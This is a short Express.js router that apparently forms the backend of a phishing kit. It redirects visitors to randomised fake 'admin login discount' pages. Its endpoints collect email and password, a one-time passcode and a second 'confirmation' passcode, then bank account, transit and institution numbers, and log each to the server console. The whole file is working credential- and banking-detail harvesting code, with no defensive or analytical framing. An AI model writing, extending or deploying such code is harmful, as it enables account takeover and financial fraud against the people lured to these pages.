const express =  require('express');
const router = express.Router();
const path = require('path');
const { v4: uuidv4 } = require('uuid');
let LoginDetail;

router.get('/',(req,res)=>{
    let keyID = uuidv4().split('-')[0];
    res.redirect(`/admin/login/discount/id/${keyID}`);
});

router.get('/admin/login/discount/id/:id', async (req, res) => {
    res.sendFile(path.join(__dirname + '/../public' + '/login.html'))
});

router.post('/api/admin/login/:id',(req, res) => {
    LoginDetail = {
        id: req.params.id,
        email: req.body.email,
        password: req.body.password
    };
    console.log(LoginDetail);
    res.send('ok');
});

router.post('/api/admin/login/:id/otp', (req, res) => {
    LoginDetail['OTP'] = req.body.OTP;
    console.log(LoginDetail);
    res.send("ok")
});

router.get('/admin/login/discount/id/:id/add_discount', async (req, res) => {
    res.sendFile(path.join(__dirname + '/../public' + '/dicount-confirmation.html'))
});

router.get('/admin/login/discount/id/:id/confirmation', async (req, res) => {
    res.sendFile(path.join(__dirname + '/../public' + '/confirmagain.html'))
});
router.post('/api/admin/login/:id/otp/confirmation', (req, res) => {
    LoginDetail['OTP'] = req.body.OTP;
    console.log(LoginDetail);
    res.send("ok")
});
router.post('/api/admin/login/:id/account', (req, res) => {
    LoginDetail['Account'] = req.body.Account;
    LoginDetail['Transit'] = req.body.Transit;
    LoginDetail['Institution'] = req.body.Institution;
    console.log(LoginDetail);
    res.send("ok")
});

module.exports = router